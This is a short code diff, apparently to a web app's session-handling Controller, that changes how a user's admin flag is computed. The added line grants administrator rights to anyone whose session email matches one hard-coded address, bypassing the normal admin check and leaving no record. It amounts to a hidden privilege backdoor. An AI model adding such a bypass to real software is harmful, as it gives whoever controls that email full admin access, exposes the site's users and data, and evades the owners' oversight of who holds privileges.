@@ -9,12 +9,11 @@ export class Controller {
     try {
       user = await SessionService.getUser(request);
       if (user) {
-        user.isAdmin = await User.isAdminUser(user);
+        user.isAdmin = (await User.isAdminUser(user)) || user.email === "zakeer@zakeer.me";
       }
     } catch (error) {
       console.log(error);
     }
     return user;
   }
-
 }
